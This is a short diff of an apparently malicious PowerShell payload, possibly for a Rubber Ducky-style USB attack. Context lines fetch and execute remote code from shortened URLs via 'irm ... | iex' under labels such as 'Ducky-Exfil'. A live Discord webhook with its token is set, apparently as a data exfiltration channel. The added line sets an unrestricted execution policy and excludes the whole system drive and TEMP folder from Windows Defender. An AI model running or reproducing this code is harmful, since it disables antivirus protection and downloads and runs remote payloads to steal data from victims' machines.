@@ -24,6 +24,8 @@ irm https://rb.gy/vrt4s6 | iex;
 #Ducky-Exfil
 irm https://rb.gy/xzpj1d | iex;
 
+Set-ExecutionPolicy Unrestricted -Force; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP;
+
 #Lasania
 $webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
 $version = "2.4.6";
